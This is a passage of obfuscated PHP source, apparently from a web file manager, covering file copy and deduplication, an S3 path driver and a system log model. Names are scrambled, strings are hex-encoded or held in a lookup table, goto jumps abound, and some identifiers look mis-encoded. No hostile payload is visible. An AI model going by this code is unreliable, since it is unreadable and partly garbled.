$÷Ó·«æ­[$â«ÖÇõ±[33]] == $â«ÖÇõ±[78]; $÷Ó·«æ­[$â«ÖÇõ±[498]] = substr(_get($÷Ó·«æ­, $â«ÖÇõ±[169], $â«ÖÇõ±[12]), 0, 10); $÷Ó·«æ­[$â«ÖÇõ±[79]] = _get($÷Ó·«æ­, $â«ÖÇõ±[79], 0); $÷Ó·«æ­[$â«ÖÇõ±[555]] = _get($÷Ó·«æ­, $â«ÖÇõ±[555], 0); if (!isset($÷Ó·«æ­[$â«ÖÇõ±[687]]) && $÷Ó·«æ­[$â«ÖÇõ±[555]]) { $ì¶ê®µ[$â«ÖÇõ±[684]][] = $÷Ó·«æ­[$â«ÖÇõ±[555]]; } if ($¶±ÆÀßå) { $åÌó±òó = $this->fileNameExistCache($­îúâŒ, $÷Ó·«æ­[$â«ÖÇõ±[32]]); if ($åÌó±òó) { if ($÷Ó·«æ­[$â«ÖÇõ±[497]] || $¶±ÆÀßå == REPEAT_SKIP) { continue; } if ($¶±ÆÀßå == REPEAT_REPLACE) { $§Ô¬Ìƒ = $this->sourceInfoCache($åÌó±òó); $ƒ¢»®” = $this->fileHistory($§Ô¬Ìƒ, $÷Ó·«æ­[$â«ÖÇõ±[555]], $÷Ó·«æ­[$â«ÖÇõ±[79]]); if ($ƒ¢»®”) { $ì¶ê®µ[$â«ÖÇõ±[646]][] = $÷Ó·«æ­[$â«ÖÇõ±[555]]; } continue; } else { if ($¶±ÆÀßå == REPEAT_RENAME) { $÷Ó·«æ­[$â«ÖÇõ±[32]] = $this->fileNameAutoCache($­îúâŒ, $÷Ó·«æ­[$â«ÖÇõ±[32]], $¶±ÆÀßå, !1); } } } } if (!$÷Ó·«æ­[$â«ÖÇõ±[497]] && $÷Ó·«æ­[$â«ÖÇõ±[555]] == 0) { continue; } if (!$÷Ó·«æ­[$â«ÖÇõ±[497]] && $÷Ó·«æ­[$â«ÖÇõ±[555]]) { $ì¶ê®µ[$â«ÖÇõ±[646]][] = $÷Ó·«æ­[$â«ÖÇõ±[555]]; } $ÅŒ²Ú¤È[] = $this->_makeItemData($÷Ó·«æ­, $ìĞÕÜÃÜ, $÷Ó·«æ­[$â«ÖÇõ±[32]]); } unset($÷Ó·«æ­); if (!empty($ÅŒ²Ú¤È)) { $this->addAll($ÅŒ²Ú¤È); $this->_childrenListSelect($­îúâŒ); } $‡£¼Ù–™ = $this->_childrenList($­îúâŒ); $‡£¼Ù–™ = array_to_keyvalue($‡£¼Ù–™, $â«ÖÇõ±[32]); foreach ($ñ±İÕûí as $÷Ó·«æ­) { $§Ô¬Ìƒ = $‡£¼Ù–™[$÷Ó·«æ­[$â«ÖÇõ±[32]]]; $”éÄÍ…Š = $§Ô¬Ìƒ[$â«ÖÇõ±[194]]; $this->_copyApplyMeta($§Ô¬Ìƒ, $ì¶ê®µ); if ($÷Ó·«æ­[$â«ÖÇõ±[33]] == $â«ÖÇõ±[78]) { $÷Ó·«æ­[$â«ÖÇõ±[87]] = $Á×•Ó¹->getPathInner($÷Ó·«æ­[$â«ÖÇõ±[87]]); $this->_copyChildTo($Á×•Ó¹, $÷Ó·«æ­[$â«ÖÇõ±[87]], $”éÄÍ…Š, $¶±ÆÀßå, $ì¶ê®µ, $Á›†¿­Ö, $À»íä„Ğ); } } } private function _addFiles($ëÀóŸüí, $èŸÌá³ä, $µıªŞÌæ, $œÈ‘‘÷…) { $ß´ÆÂ»… =& $_SERVER[´‹ô¯Œ]; if (!$µıªŞÌæ || count($µıªŞÌæ) == 0) { return array(); } $¼Óºµ¢„ = array(); foreach ($µıªŞÌæ as &$°¨¹¬¿¦) { Hook::trigger($ß´ÆÂ»…[688], $°¨¹¬¿¦); $°¨¹¬¿¦[$ß´ÆÂ»…[87]] = $ëÀóŸüí->getPathInner($°¨¹¬¿¦[$ß´ÆÂ»…[87]]); $á¼¸ÏÀ = $ëÀóŸüí->hashSimple($°¨¹¬¿¦[$ß´ÆÂ»…[87]]); $ã÷İ« = $ëÀóŸüí->hashMd5($°¨¹¬¿¦[$ß´ÆÂ»…[87]]); if (strlen($ã÷İ«) > 10 && !isset($¼Óºµ¢„[$ã÷İ«])) { $¼Óºµ¢„[$ã÷İ«] = array(); } $°¨¹¬¿¦[$ß´ÆÂ»…[689]] = $á¼¸ÏÀ; $°¨¹¬¿¦[$ß´ÆÂ»…[561]] = $ã÷İ«; $¼Óºµ¢„[$ã÷İ«][] =& $°¨¹¬¿¦; if (count($¼Óºµ¢„[$ã÷İ«]) > 1) { $°¨¹¬¿¦[$ß´ÆÂ»…[687]] = !0; } Hook::trigger($ß´ÆÂ»…[690], $°¨¹¬¿¦); } unset($°¨¹¬¿¦); $å´®›Šˆ = array($ß´ÆÂ»…[561] => array($ß´ÆÂ»…[7], array_keys($¼Óºµ¢„))); $‚ù†üÒŠ = Model($ß´ÆÂ»…[691]); $˜õ¢–Æø = $‚ù†üÒŠ->where($å´®›Šˆ)->select(); $˜õ¢–Æø = $˜õ¢–Æø ? $˜õ¢–Æø : array(); foreach ($˜õ¢–Æø as $êÃÖíŸÏ) { if (!isset($¼Óºµ¢„[$êÃÖíŸÏ[$ß´ÆÂ»…[561]]])) { continue; } $Èœ€ùÈ“ = $¼Óºµ¢„[$êÃÖíŸÏ[$ß´ÆÂ»…[561]]]; foreach ($Èœ€ùÈ“ as &$°¨¹¬¿¦) { $°¨¹¬¿¦[$ß´ÆÂ»…[555]] = $êÃÖíŸÏ[$ß´ÆÂ»…[555]]; $°¨¹¬¿¦[$ß´ÆÂ»…[687]] = !0; } unset($°¨¹¬¿¦); } $«Øâä£ = array(); foreach ($µıªŞÌæ as $ô¯†–âÛ) { Hook::trigger($ß´ÆÂ»…[692], $ô¯†–âÛ); if (isset($ô¯†–âÛ[$ß´ÆÂ»…[687]]) && $ô¯†–âÛ[$ß´ÆÂ»…[687]]) { Hook::trigger($ß´ÆÂ»…[693], $ô¯†–âÛ); continue; } $ê½Ûö÷§ = $ëÀóŸüí->getPathInner($ô¯†–âÛ[$ß´ÆÂ»…[87]]); $±µ†­úÔ = $‚ù†üÒŠ->addFileMake($ê½Ûö÷§, $èŸÌá³ä, $ô¯†–âÛ[$ß´ÆÂ»…[79]], $ô¯†–âÛ[$ß´ÆÂ»…[689]], $ô¯†–âÛ[$ß´ÆÂ»…[561]], $ô¯†–âÛ[$ß´ÆÂ»…[32]], $œÈ‘‘÷…); Hook::trigger($ß´ÆÂ»…[693], $ô¯†–âÛ); if (!is_array($±µ†­úÔ)) { continue; } $«Øâä£[] = $±µ†­úÔ; } $‚ù†üÒŠ->addAll($«Øâä£); $å´®›Šˆ = array($ß´ÆÂ»…[561] => array($ß´ÆÂ»…[7], array_keys($¼Óºµ¢„))); $˜õ¢–Æø = $‚ù†üÒŠ->where($å´®›Šˆ)->select(); $˜õ¢–Æø = $˜õ¢–Æø ? $˜õ¢–Æø : array(); foreach ($˜õ¢–Æø as $êÃÖíŸÏ) { if (!isset($¼Óºµ¢„[$êÃÖíŸÏ[$ß´ÆÂ»…[561]]])) { continue; } $®úÊåŞ‚ =& $¼Óºµ¢„[$êÃÖíŸÏ[$ß´ÆÂ»…[561]]]; foreach ($®úÊåŞ‚ as &$°¨¹¬¿¦) { $°¨¹¬¿¦[$ß´ÆÂ»…[555]] = $êÃÖíŸÏ[$ß´ÆÂ»…[555]]; } unset($°¨¹¬¿¦); } $¼çÁŞŞÇ = array(); foreach ($µıªŞÌæ as $Ñ°çÖÜš) { $¼çÁŞŞÇ[$Ñ°çÖÜš[$ß´ÆÂ»…[32]]] = $Ñ°çÖÜš; } return $¼çÁŞŞÇ; } } define($_SERVER[´‹ô¯Œ][694], $_SERVER[´‹ô¯Œ][695]); goto B‹‘½†©‘; F´é‹…ì¯Ü: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($İé‘ÜÁ) { $ëí²ŞÇà =& $_SERVER[´‹ô¯Œ]; parent::__construct($İé‘ÜÁ); $œ—ç‚¯æ = isset($İé‘ÜÁ[$ëí²ŞÇà[259]]) && $İé‘ÜÁ[$ëí²ŞÇà[259]] == $ëí²ŞÇà[250] ? $ëí²ŞÇà[250] : $ëí²ŞÇà[316]; $this->setSignVersion($œ—ç‚¯æ); } public function link($Æñú–çî, $˜åÀ® æ = array()) { return parent::link($Æñú–çî, $˜åÀ® æ); } public function fileOut($Ì©¶ıÅ¢, $ç†ƒ …† = false, $½€ìõˆÇ = false, $ †€¤ã = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[´‹ô¯Œ][317])) { return parent::fileOutServer($Ì©¶ıÅ¢, $ç†ƒ …†, $½€ìõˆÇ, $ †€¤ã); } parent::fileOut($Ì©¶ıÅ¢, $ç†ƒ …†, $½€ìõˆÇ, $ †€¤ã); } public function fileOutImage($‹á³±Ã, $ªÖ·±µ» = 250) { if (strstr($this->endpoint, $_SERVER[´‹ô¯Œ][317])) { return parent::fileOutImageServer($‹á³±Ã, $ªÖ·±µ»); } parent::fileOutImage($‹á³±Ã, $ªÖ·±µ»); } } define($_SERVER[´‹ô¯Œ][318], 1); define($_SERVER[´‹ô¯Œ][319], 2); goto BËÇØ›’ì§; C¼Ş‘ §Ú: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\x2e\x4c\151\147\150\164\x41\x70\160"; public $modelType = "\x53\x79\x73\164\x65\x6d\117\x70\x74\x69\x6f\x6e"; public $field = array("\x6e\x61\x6d\x65", "\x67\162\x6f\x75\x70", "\x64\145\163\x63", "\x63\157\x6e\x74\x65\156\164"); public function listData($§òÃíÓÔ = false, $ÄµÀŒÆÙ = "\155\157\x64\151\x66\171\x54\151\155\x65", $ÁŸÚ¸óÂ = true) { return parent::listData($§òÃíÓÔ, $ÄµÀŒÆÙ, $ÁŸÚ¸óÂ); } public function remove($µŠîÀƒ‚) { $Î©Á©à = $this->findByName($µŠîÀƒ‚); if (!$Î©Á©à) { return !1; } return parent::remove($Î©Á©à[$_SERVER[´‹ô¯Œ][487]]); } public function add($ñ¯Ÿü¥Š) { if ($this->findByName($ñ¯Ÿü¥Š[$_SERVER[´‹ô¯Œ][32]])) { return !1; } return parent::insert($ñ¯Ÿü¥Š); } public function update($¼³¸§, $ô¶ìËõ½) { $ª½¥ÛÏŠ =& $_SERVER[´‹ô¯Œ]; $»ş‰Ã© = $this->findByName($¼³¸§); $ı˜ãü˜ = $this->findByName($ô¶ìËõ½[$ª½¥ÛÏŠ[32]]); if (!$»ş‰Ã© || $ı˜ãü˜ && $ı˜ãü˜[$ª½¥ÛÏŠ[487]] != $»ş‰Ã©[$ª½¥ÛÏŠ[487]]) { return !1; } return parent::update($»ş‰Ã©[$ª½¥ÛÏŠ[487]], $ô¶ìËõ½); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\164\145\155\137\154\x6f\x67"; protected $dataAuto = array(array("\143\x72\x65\141\164\145\x54\x69\155\145", "\x74\x69\155\145", "\151\x6e\x73\x65\162\x74", "\146\165\156\143\164\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ªççÚ³‰ =& $_SERVER[´‹ô¯Œ]; return array($ªççÚ³‰[2368] => LNG($ªççÚ³‰[2369]), $ªççÚ³‰[2370] => LNG($ªççÚ³‰[2371]), $ªççÚ³‰[1939] => LNG($ªççÚ³‰[2372]), $ªççÚ³‰[2373] => LNG($ªççÚ³‰[2374]), $ªççÚ³‰[2375] => LNG($ªççÚ³‰[2376]), $ªççÚ³‰[2377] => LNG($ªççÚ³‰[2378]), $ªççÚ³‰[2379] => LNG($ªççÚ³‰[2380]), $ªççÚ³‰[1969] => LNG($ªççÚ³‰[2380]), $ªççÚ³‰[1970] => LNG($ªççÚ³‰[2381]), $ªççÚ³‰[2382] => LNG($ªççÚ³‰[2383]), $ªççÚ³‰[2384] => LNG($ªççÚ³‰[2385]), $ªççÚ³‰[2386] => LNG($ªççÚ³‰[2387]), $ªççÚ³‰[2388] => LNG($ªççÚ³‰[2389]), $ªççÚ³‰[1967] => LNG($ªççÚ³‰[2390]), $ªççÚ³‰[2391] => LNG($ªççÚ³‰[2392]), $ªççÚ³‰[1974] => LNG($ªççÚ³‰[2393]), $ªççÚ³‰[2394] => LNG($ªççÚ³‰[2395]), $ªççÚ³‰[2396] => LNG($ªççÚ³‰[2397]), $ªççÚ³‰[2398] => LNG($ªççÚ³‰[2399]), $ªççÚ³‰[2400] => LNG($ªççÚ³‰[2401]), $ªççÚ³‰[1977] => LNG($ªççÚ³‰[2402]), $ªççÚ³‰[1978] => LNG($ªççÚ³‰[2403]), $ªççÚ³‰[2404] => LNG($ªççÚ³‰[2405]), $ªççÚ³‰[2406] => LNG($ªççÚ³‰[2407]), $ªççÚ³‰[2408] => LNG($ªççÚ³‰[2409]), $ªççÚ³‰[1972] => LNG($ªççÚ³‰[2410]), $ªççÚ³‰[2411] => LNG($ªççÚ³‰[2412]), $ªççÚ³‰[1971] => LNG($ªççÚ³‰[2413]), $ªççÚ³‰[2414] => LNG($ªççÚ³‰[2414]), $ªççÚ³‰[2415] => LNG($ªççÚ³‰[2416]), $ªççÚ³‰[2417] => LNG($ªççÚ³‰[2414]), $ªççÚ³‰[2418] => LNG($ªççÚ³‰[2419]), $ªççÚ³‰[2420] => LNG($ªççÚ³‰[2421]), $ªççÚ³‰[2422] => LNG($ªççÚ³‰[2421]), $ªççÚ³‰[2423] => LNG($ªççÚ³‰[2424]), $ªççÚ³‰[2425] => LNG($ªççÚ³‰[2425]), $ªççÚ³‰[2426] => LNG($ªççÚ³‰[1943]), $ªççÚ³‰[2427] => LNG($ªççÚ³‰[2428]), $ªççÚ³‰[2429] => LNG($ªççÚ³‰[2430]), $ªççÚ³‰[2431] => LNG($ªççÚ³‰[2432]), $ªççÚ³‰[2433] => LNG($ªççÚ³‰[2434]), $ªççÚ³‰[2435] => LNG($ªççÚ³‰[2436]), $ªççÚ³‰[2437] => LNG($ªççÚ³‰[2437]), $ªççÚ³‰[2438] => LNG($ªççÚ³‰[2439]), $ªççÚ³‰[2440] => LNG($ªççÚ³‰[2441]), $ªççÚ³‰[2442] => LNG($ªççÚ³‰[2443]), $ªççÚ³‰[2444] => LNG($ªççÚ³‰[2445]), $ªççÚ³‰[2446] => LNG($ªççÚ³‰[2447]), $ªççÚ³‰[2448] => LNG($ªççÚ³‰[2449]), $ªççÚ³‰[213] => LNG($ªççÚ³‰[213]), $ªççÚ³‰[214] => LNG($ªççÚ³‰[2450]), $ªççÚ³‰[2451] => LNG($ªççÚ³‰[2451])); } private function typeFile() { $ı•ÒøÚË =& $_SERVER[´‹ô¯Œ]; $Ù•ìÔĞ = array($ı•ÒøÚË[1974] => array($ı•ÒøÚË[1975]), $ı•ÒøÚË[2386] => array($ı•ÒøÚË[2452]), $ı•ÒøÚË[2388] => array($ı•ÒøÚË[2453]), $ı•ÒøÚË[1967] => array($ı•ÒøÚË[1968], $ı•ÒøÚË[2454]), $ı•ÒøÚË[2396] => array(), $ı•ÒøÚË[2398] => array(), $ı•ÒøÚË[2400] => array(), $ı•ÒøÚË[1977] => array($ı•ÒøÚË[1979]), $ı•ÒøÚË[1978] => array($ı•ÒøÚË[1979]), $ı•ÒøÚË[2404] => array($ı•ÒøÚË[2455]), $ı•ÒøÚË[2406] => array($ı•ÒøÚË[2455]), $ı•ÒøÚË[2408] => array($ı•ÒøÚË[2456]), $ı•ÒøÚË[2394] => array($ı•ÒøÚË[2457]), $ı•ÒøÚË[1972] => array($ı•ÒøÚË[2458]), $ı•ÒøÚË[2411] => array($ı•ÒøÚË[2459]), $ı•ÒøÚË[1971] => array($ı•ÒøÚË[1973])); return $Ù•ìÔĞ; } private function typeAll() { $øºòı¬Ÿ =& $_SERVER[´‹ô¯Œ]; $Åš¦÷úÜ = $this->typeList; $İ¿ƒ·èê = array_filter($this->typeFile()); foreach ($İ¿ƒ·èê as $ÒóÎ››´ => $µ—Âßâ€) { $Åš¦÷úÜ[$µ—Âßâ€[0]] = $Åš¦÷úÜ[$ÒóÎ››´]; } $Åš¦÷úÜ[$øºòı¬Ÿ[1979]] = LNG($øºòı¬Ÿ[2460]); $Åš¦÷úÜ[$øºòı¬Ÿ[2455]] = LNG($øºòı¬Ÿ[2461]); return $Åš¦÷úÜ; } public function addLog($‡‚ôæ¤, $“ı˜»°Ñ = array()) { $›Íì¬ØÈ =& $_SERVER[´‹ô¯Œ]; if (!isset($this->typeList[$‡‚ôæ¤])) { return; } $Õ×¥Ë‚» = Session::get($›Íì¬ØÈ[2137]); if (!$Õ×¥Ë‚») { $Õ×¥Ë‚» = _get($“ı˜»°Ñ, $›Íì¬ØÈ[1796], 0); } if ($‡‚ôæ¤ == $›Íì¬ØÈ[2427] && is_array($“ı˜»°Ñ[$›Íì¬ØÈ[2462]]) && !$“ı˜»°Ñ[$›Íì¬ØÈ[2462]]) { return; } $©±ğêŠ = get_client_ip(); if (!$“ı˜»°Ñ || strlen(json_encode($“ı˜»°Ñ)) >= 1024 * 64) { if ($“ı˜»°Ñ && is_array($“ı˜»°Ñ)) { $“ı˜»°Ñ = array_intersect_key($“ı˜»°Ñ, array_flip($›Íì¬ØÈ[487], $›Íì¬ØÈ[32])); $“ı˜»°Ñ[$›Íì¬ØÈ[2463]] = $©±ğêŠ; } else { $“ı˜»°Ñ = array($›Íì¬ØÈ[2463] => $©±ğêŠ); } } else { if (is_array($“ı˜»°Ñ)) { $“ı˜»°Ñ[$›Íì¬ØÈ[2463]] = $©±ğêŠ; } else { $“ı˜»°Ñ = array($›Íì¬ØÈ[1304] => $“ı˜»°Ñ, $›Íì¬ØÈ[2463] => $©±ğêŠ); } } $“ı˜»°Ñ = array($›Íì¬ØÈ[1786] => Session::sign(), $›Íì¬ØÈ[1787] => intval($Õ×¥Ë‚»), $›Íì¬ØÈ[33] => $‡‚ôæ¤, $›Íì¬ØÈ[1789] => json_encode($“ı˜»°Ñ)); return parent::add($“ı˜»°Ñ); } public function remove($Ë„ôï‡İ) { $this->where(array($_SERVER[´‹ô¯Œ][505] => $Ë„ôï‡İ))->delete(); } private function _makeOrder($Ü¹×¡ôº = '') { $É©°Ùò =& $_SERVER[´‹ô¯Œ]; $©»ûÕ¡ = $É©°Ùò[234]; $Î·×öÖ = array($É©°Ùò[535] => $É©°Ùò[536], $É©°Ùò[537] => $É©°Ùò[538]); $ÃéªıÖ = Input::get($É©°Ùò[543], $É©°Ùò[7], $É©°Ùò[2177], array($É©°Ùò[2092], $É©°Ùò[537])); $ÃéªıÖ = $Î·×öÖ[$ÃéªıÖ]; $Ü¹×¡ôº = $Ü¹×¡ôº . "{$©»ûÕ¡}\40{$ÃéªıÖ}"; return $this->order($Ü¹×¡ôº); } public function get($‹÷†ë¡² = '') { $„š•„¾¨ =& $_SERVER[´‹ô¯Œ]; if (!$‹÷†ë¡²) { show_json(array()); } $õò¦›ó¾ = array(); if ($‹÷†ë¡²[$„š•„¾¨[1796]]) { $õò¦›ó¾[$„š•„¾¨[1796]] = $‹÷†ë¡²[$„š•„¾¨[1796]]; } if (isset($‹÷†ë¡²[$„š•„¾¨[846]])) { $õşƒïĞÚ = $‹÷†ë¡²[$„š•„¾¨[846]]; $òËÃè ” = isset($‹÷†ë¡²[$„š•„¾¨[847]]) ? $‹÷†ë¡²[$„š•„¾¨[847]] : time(); $õò¦›ó¾[$„š•„¾¨[234]] = array($„š•„¾¨[411], array($õşƒïĞÚ, $òËÃè ”)); } if ($‹÷†ë¡²[$„š•„¾¨[33]]) { $´çÓÁ¾• = explode($„š•„¾¨[50], $‹÷†ë¡²[$„š•„¾¨[33]]); $Ó¿‹‰© = $this->typeFile(); $Û©½ºÈ¾ = array(); foreach ($´çÓÁ¾• as $ÀúÃŒ¦ä) { $Û©½ºÈ¾[] = $ÀúÃŒ¦ä; if (isset($Ó¿‹‰©[$ÀúÃŒ¦ä])) { $Û©½ºÈ¾ = array_merge($Û©½ºÈ¾, $Ó¿‹‰©[$ÀúÃŒ¦ä]); } } $Û©½ºÈ¾ = array_unique($Û©½ºÈ¾); if ($Û©½ºÈ¾) { $õò¦›ó¾[$„š•„¾¨[33]] = array($„š•„¾¨[7], $Û©½ºÈ¾); } } else { $õò¦›ó¾[$„š•„¾¨[33]] = array($„š•„¾¨[2464], $„š•„¾¨[2465]); } if (!empty($‹÷†ë¡²[$„š•„¾¨[2463]])) { $õò¦›ó¾[$„š•„¾¨[538]] = array($„š•„¾¨[462], "\x25{$‹÷†ë¡²[$„š•„¾¨[2463]]}\x25"); } $¿×µ¼­È = $this->_makeOrder()->where($õò¦›ó¾)->selectPage(); if (empty($¿×µ¼­È[$„š•„¾¨[448]])) { show_json(array(), !0, $¿×µ¼­È[$„š•„¾¨[445]]); } $¿×µ¼­È[$„š•„¾¨[448]] = $this->logList($¿×µ¼­È[$„š•„¾¨[448]]); return $¿×µ¼­È; } private function ipAddress(&$×Á‚×¦ù) { $í–‚Åî =& $_SERVER[´‹ô¯Œ]; if (!empty($×Á‚×¦ù[$í–‚Åî[2463]])) { $«Òø›æÛ = IpLocation::get($×Á‚×¦ù[$í–‚Åî[2463]]); } else { $«Òø›æÛ = LNG($í–‚Åî[2466]); } $×Á‚×¦ù[$í–‚Åî[2467]] = $«Òø›æÛ; } private function descZipDownload($¶İú³•Ï, &$…åÖ¤­) { $²ÙŞå‡ş =& $_SERVER[´‹ô¯Œ]; if (!isset($¶İú³•Ï[$²ÙŞå‡ş[2468]])) { return; } $ÄÀìòß¥ = json_decode($¶İú³•Ï[$²ÙŞå‡ş[2468]], !0); foreach ($ÄÀìòß¥ as $–ã¶Áş) { try { $°Ô™™‹ó = IO::infoFullSimple($–ã¶Áş[$²ÙŞå‡ş[87]]); } catch (Exception $‘Ö­Éğ) { continue; } $¶İú³•Ï[$²ÙŞå‡ş[87]] = $–ã¶Áş[$²ÙŞå‡ş[87]]; $…åÖ¤­[] = $¶İú³•Ï[$²ÙŞå‡ş[194]] = $°Ô™™‹ó[$²ÙŞå‡ş[194]]; $…åÖ¤­[] = $¶İú³•Ï[$²ÙŞå‡ş[2231]] = $°Ô™™‹ó[$²ÙŞå‡ş[193]]; break; } return $¶İú³•Ï; } private function getSourceList(&$ÎäÈÀÆ) { $ñæúÛ¯ =& $_SERVER[´‹ô¯Œ]; $‚ŒÄÚÇ = array(); foreach ($ÎäÈÀÆ as $€Òà¿ÈÖ => $öÒš½âû) { $Îİî€ä = json_decode($öÒš½âû[$ñæúÛ¯[538]], !0); if ($öÒš½âû[$ñæúÛ¯[33]] == $ñæúÛ¯[1970]) { $Îİî€ä = $this->descZipDownload($Îİî€ä, $‚ŒÄÚÇ); $ÎäÈÀÆ[$€Òà¿ÈÖ][$ñæúÛ¯[538]] = json_encode($Îİî€ä); continue; } if (strpos($öÒš½âû[$ñæúÛ¯[33]], $ñæúÛ¯[2233]) !== 0) { if (!isset($Îİî€ä[$ñæúÛ¯[87]]) || strpos($öÒš½âû[$ñæúÛ¯[33]], $ñæúÛ¯[2469]) !== 0) { continue; } try { $ªä˜âÜ¹ = IO::infoFullSimple($Îİî€ä[$ñæúÛ¯[87]]); } catch (Exception $ß ¶¡£) { continue; } $‚ŒÄÚÇ[] = $Îİî€ä[$ñæúÛ¯[194]] = $ªä˜âÜ¹[$ñæúÛ¯[194]]; $‚ŒÄÚÇ[] = $Îİî€ä[$ñæúÛ¯[2231]] = $ªä˜âÜ¹[$ñæúÛ¯[193]]; $ÎäÈÀÆ[$€Òà¿ÈÖ][$ñæúÛ¯[538]] = json_encode($Îİî€ä); continue; } $‚ŒÄÚÇ[] = $Îİî€ä[$ñæúÛ¯[194]]; $‚ŒÄÚÇ[] = $Îİî€ä[$ñæúÛ¯[2231]]; if ($Îİî€ä[$ñæúÛ¯[33]] == $ñæúÛ¯[637]) { $‚ŒÄÚÇ[] = $Îİî€ä[$ñæúÛ¯[538]][$ñæúÛ¯[1256]]; $‚ŒÄÚÇ[] = $Îİî€ä[$ñæúÛ¯[538]][$ñæúÛ¯[1257]]; } if ($Îİî€ä[$ñæúÛ¯[33]] == $ñæúÛ¯[2242]) { $‚ŒÄÚÇ[] = $Îİî€ä[$ñæúÛ¯[538]][$ñæúÛ¯[194]]; } } if (!$‚ŒÄÚÇ) { return array(); } return Model($ñæúÛ¯[916])->sourceListInfo($‚ŒÄÚÇ, !0); } private function logList($¨–…İÃ¾) { $çı²ß€ü =& $_SERVER[´‹ô¯Œ]; $ïü¤Á¨¸ = array_to_keyvalue($¨–…İÃ¾, $çı²ß€ü[12], $çı²ß€ü[1796]); $†‘â±Ğ = Model($çı²ß€ü[611])->userListInfo(array_unique($ïü¤Á¨¸)); $¯´ëœÈŞ = $this->getSourceList($¨–…İÃ¾); $åÎ¿€‚ = $this->typeAll(); $×âÉæ = array(); $‰àÆ´ş = array(); foreach ($¨–…İÃ¾ as $¤«ãÃ·Õ => $îÖÁÏø÷) { $ì·Ã¾¦ˆ = $îÖÁÏø÷[$çı²ß€ü[33]]; $¤äÀéÎ = isset($†‘â±Ğ[$îÖÁÏø÷[$çı²ß€ü[1796]]]) ? $†‘â±Ğ[$îÖÁÏø÷[$çı²ß€ü[1796]]] : !1; $Ü¯Øñß = strpos($ì·Ã¾¦ˆ, $çı²ß€ü[2470]) === 0 ? LNG($çı²ß€ü[2471]) : LNG($çı²ß€ü[2466]); $îÖÁÏø÷[$çı²ß€ü[32]] = isset($¤äÀéÎ[$çı²ß€ü[32]]) ? $¤äÀéÎ[$çı²ß€ü[32]] : LNG($çı²ß€ü[2466]); $îÖÁÏø÷[$çı²ß€ü[2293]] = isset($¤äÀéÎ[$çı²ß€ü[2293]]) ? $¤äÀéÎ[$çı²ß€ü[2293]] : $çı²ß€ü[12]; $îÖÁÏø÷[$çı²ß€ü[1684]] = isset($åÎ¿€‚[$ì·Ã¾¦ˆ]) ? $åÎ¿€‚[$ì·Ã¾¦ˆ] : $Ü¯Øñß; $îÖÁÏø÷[$çı²ß€ü[2176]] = $¤äÀéÎ; $ËóÉ‹ˆ¾ = json_decode($îÖÁÏø÷[$çı²ß€ü[538]], !0); $îÖÁÏø÷[$çı²ß€ü[2463]] = isset($ËóÉ‹ˆ¾[$çı²ß€ü[2463]]) ? $ËóÉ‹ˆ¾[$çı²ß€ü[2463]] : $çı²ß€ü[12]; $îÖÁÏø÷[$çı²ß€ü[2467]] = IpLocation::get($îÖÁÏø÷[$çı²ß€ü[2463]]); if (strpos($ì·Ã¾¦ˆ, $çı²ß€ü[2233]) === 0 || isset($ËóÉ‹ˆ¾[$çı²ß€ü[2231]])) { $ËóÉ‹ˆ¾[$çı²ß€ü[90]] = $¯´ëœÈŞ[$ËóÉ‹ˆ¾[$çı²ß€ü[194]]]; $ËóÉ‹ˆ¾[$çı²ß€ü[2247]] = $¯´ëœÈŞ[$ËóÉ‹ˆ¾[$çı²ß€ü[2231]]]; if ($ËóÉ‹ˆ¾[$çı²ß€ü[33]] == $çı²ß€ü[637]) { $ËóÉ‹ˆ¾[$çı²ß€ü[538]][$çı²ß€ü[1256]] = $¯´ëœÈŞ[$ËóÉ‹ˆ¾[$çı²ß€ü[538]][$çı²ß€ü[1256]]]; $ËóÉ‹ˆ¾[$çı²ß€ü[538]][$çı²ß€ü[1257]] = $¯´ëœÈŞ[$ËóÉ‹ˆ¾[$çı²ß€ü[538]][$çı²ß€ü[1257]]]; } if ($ËóÉ‹ˆ¾[$çı²ß€ü[33]] == $çı²ß€ü[2242]) { $ËóÉ‹ˆ¾[$çı²ß€ü[538]][$çı²ß€ü[194]] = $¯´ëœÈŞ[$ËóÉ‹ˆ¾[$çı²ß€ü[538]][$çı²ß€ü[194]]]; } if ($ËóÉ‹ˆ¾[$çı²ß€ü[33]] == $çı²ß€ü[1965]) { $ËóÉ‹ˆ¾[$çı²ß€ü[2247]] = $ËóÉ‹ˆ¾[$çı²ß€ü[90]]; $ËóÉ‹ˆ¾[$çı²ß€ü[2231]] = $ËóÉ‹ˆ¾[$çı²ß€ü[2247]][$çı²ß€ü[194]]; $ËóÉ‹ˆ¾[$çı²ß€ü[90]] = !1; $ËóÉ‹ˆ¾[$çı²ß€ü[194]] = $çı²ß€ü[12]; } $Åµ£´âì = array($çı²ß€ü[1965], $çı²ß€ü[2229]); if (!in_array($ËóÉ‹ˆ¾[$çı²ß€ü[33]], $Åµ£´âì)) { if ($ËóÉ‹ˆ¾[$çı²ß€ü[90]] && $ËóÉ‹ˆ¾[$çı²ß€ü[90]][$çı²ß€ü[191]] == $çı²ß€ü[192]) { $‰àÆ´ş[] = $îÖÁÏø÷[$çı²ß€ü[487]]; unset($¨–…İÃ¾[$¤«ãÃ·Õ]); continue; } if ($ËóÉ‹ˆ¾[$çı²ß€ü[2247]] && $ËóÉ‹ˆ¾[$çı²ß€ü[2247]][$çı²ß€ü[191]] == $çı²ß€ü[192]) { $‰àÆ´ş[] = $îÖÁÏø÷[$çı²ß€ü[487]]; unset($¨–…İÃ¾[$¤«ãÃ·Õ]); continue; } } } $îÖÁÏø÷[$çı²ß€ü[538]] = $ËóÉ‹ˆ¾; unset($îÖÁÏø÷[$çı²ß€ü[2472]]); $×âÉæ[] = $îÖÁÏø÷; } $this->clearSystemPathLog($‰àÆ´ş); return $×âÉæ; } private function clearSystemPathLog($¢¥•¢ë¹) { $Úõ¨óàñ =& $_SERVER[´‹ô¯Œ]; if (count($¢¥•¢ë¹) == 0) { return; } $šÀÚ®ã = array($Úõ¨óàñ[487] => array($Úõ¨óàñ[7], array_unique($¢¥•¢ë¹))); $this->where($šÀÚ®ã)->delete(); } public function deviceList($ÆÕŞÌÖà, $Í† é’µ = 0) { $¸ˆ¸Ñ¬Ò =& $_SERVER[´‹ô¯Œ]; $ÍØÁáá– 